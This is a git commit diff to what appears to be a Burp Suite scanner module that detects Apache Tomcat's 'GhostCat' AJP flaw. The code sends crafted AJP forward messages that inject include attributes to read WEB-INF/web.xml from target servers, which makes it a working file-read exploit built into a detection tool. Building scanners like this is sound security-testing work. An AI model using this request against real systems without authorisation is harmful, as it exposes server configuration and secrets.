b563191809f0b062da80793f39cffa15b3b49e4d
ilmila <enrico.milanese@gmail.com>
2020-03-07 08:47:27 +0100

    Improved detection for Apache GhostCat

--- src/main/java/burp/j2ee/issues/impl/AJP_Tomcat_GhostCat.java
+++ src/main/java/burp/j2ee/issues/impl/AJP_Tomcat_GhostCat.java
@@ -1,6 +1,7 @@
 package burp.j2ee.issues.impl;
 
 import burp.CustomHttpRequestResponse;
+import static burp.HTTPMatcher.getApplicationContext;
 import static burp.HTTPMatcher.getMatches;
 import burp.j2ee.Confidence;
 import burp.j2ee.CustomScanIssue;
@@ -15,6 +16,7 @@ import burp.IHttpRequestResponse;
 import burp.IRequestInfo;
 import burp.IScanIssue;
 import burp.IScannerInsertionPoint;
+import static burp.J2EELocalAssessment.analyzeWEBXML;
 import burp.j2ee.annotation.RunOnlyOnce;
 
 import java.io.IOException;
@@ -22,6 +24,7 @@ import java.io.PrintWriter;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 
 /**
@@ -29,14 +32,12 @@ import java.util.List;
  *
  *
  *
- * References:
- *  - AJP Bug Implementation credits:
- *     - https://github.com/threedr3am/learnjavabug/tree/master/tomcat/ajp-bug/src/main/java/com/threedr3am/bug/tomcat/ajp
+ * References: - AJP Bug Implementation credits: -
+ * https://github.com/threedr3am/learnjavabug/tree/master/tomcat/ajp-bug/src/main/java/com/threedr3am/bug/tomcat/ajp
  *
- * TODO:
+ *
+ * TODO: 
  * - Hardcoded AJP port 8009 
- * - Improve to retrieve web.xml resource for each application context
- * - Analyze web.xml for vulnerabilities
  *
  */
 public class AJP_Tomcat_GhostCat implements IModule {
@@ -77,59 +78,83 @@ public class AJP_Tomcat_GhostCat implements IModule {
         int DEFAULT_AJP_PORT = 8009;
 
         List<IScanIssue> issues = new ArrayList<>();
-
         
+        
+
+        /**
+         * Attempt on the application context
+         */
+        String contextPath = getApplicationContext(url);
+
+        List<String> WEBINF_PATHS = Arrays.asList(
+                "/" + contextPath + "/WEB-INF/web.xml",
+                "WEB-INF/web.xml"
+        );
+
         SimpleAjpClient ac = new SimpleAjpClient();
         String uri = "/xxxxxxxxxxxxxxxest.xxx";
-        String file = "WEB-INF/web.xml";
         String ajp_forward_result = "";
 
-        try {
+        for (String WEBINF_PATH : WEBINF_PATHS) {
 
-            ac.connect(host, DEFAULT_AJP_PORT);
+            stdout.println("Testing AJP GhostCat on path_info " + WEBINF_PATH);
+            
+            try {
 
-            TesterAjpMessage forwardMessage = ac.createForwardMessage(uri);
-            forwardMessage.addAttribute("javax.servlet.include.request_uri", "1");
-            forwardMessage.addAttribute("javax.servlet.include.path_info", file);
-            forwardMessage.addAttribute("javax.servlet.include.servlet_path", "");
+                ac.connect(host, DEFAULT_AJP_PORT);
 
-            forwardMessage.end();
+                TesterAjpMessage forwardMessage = ac.createForwardMessage(uri);
+                forwardMessage.addAttribute("javax.servlet.include.request_uri", "1");
+                forwardMessage.addAttribute("javax.servlet.include.path_info", WEBINF_PATH);
+                forwardMessage.addAttribute("javax.servlet.include.servlet_path", "");
 
-            ac.sendMessage(forwardMessage);
+                forwardMessage.end();
 
-            while (true) {
-                byte[] responseBody = ac.readMessage();
-                if (responseBody == null || responseBody.length == 0) {
-                    break;
-                }
-                ajp_forward_result += new String(responseBody);
+                ac.sendMessage(forwardMessage);
 
-                // look for matches of our active check grep string List<int[]>
-                List<int[]> matches = getMatches(ajp_forward_result.getBytes(), GREP_STRING, helpers);
+                while (true) {
+                    byte[] responseBody = ac.readMessage();
+                    if (responseBody == null || responseBody.length == 0) {
+                        break;
+                    }
+                    ajp_forward_result += new String(responseBody);
 
-                if (matches.size() > 0) {
+                    // look for matches of our active check grep string List<int[]>
+                    List<int[]> matches = getMatches(ajp_forward_result.getBytes(), GREP_STRING, helpers);
 
-                    try {
-                        issues.add(new CustomScanIssue(
-                                baseRequestResponse.getHttpService(),
-                                new URL(url.getProtocol(), url.getHost(), DEFAULT_AJP_PORT, "AJP_TCP_" + DEFAULT_AJP_PORT),
-                                new CustomHttpRequestResponse("<REDACTED>".getBytes(), ajp_forward_result.getBytes(),
-                                        baseRequestResponse.getHttpService()),
-                                TITLE,
-                                DESCRIPTION,
-                                REMEDY,
-                                Risk.High,
-                                Confidence.Certain));
-                    } catch (MalformedURLException ex) {
-                        stderr.println(ex);
+                    if (matches.size() > 0) {
+
+                        try {
+                            issues.add(new CustomScanIssue(
+                                    baseRequestResponse.getHttpService(),
+                                    new URL(url.getProtocol(), url.getHost(), DEFAULT_AJP_PORT, "AJP_TCP_" + DEFAULT_AJP_PORT),
+                                    new CustomHttpRequestResponse("<REDACTED>".getBytes(), ajp_forward_result.getBytes(),
+                                            baseRequestResponse.getHttpService()),
+                                    TITLE,
+                                    DESCRIPTION,
+                                    REMEDY,
+                                    Risk.High,
+                                    Confidence.Certain));
+                            
+                            // Analyze the web.xml file to identify potential security configuration issues
+                            analyzeWEBXML(ajp_forward_result.getBytes(), callbacks, baseRequestResponse);  
+                            
+                        } catch (MalformedURLException ex) {
+                            stderr.println(ex);
+                            
+                        } catch (Exception ex) {
+                            stderr.println("AJP Tomcat GhostCat error: " + ex);
+                        }
+                        
+                        return issues;
                     }
                 }
+
+                ac.disconnect();
+
+            } catch (IOException ex) {
+                stderr.println("AJP Tomcat GhostCat error: " + ex);
             }
-
-            ac.disconnect();
-
-        } catch (IOException ex) {
-            stderr.println(ex);
         }
 
         return issues;
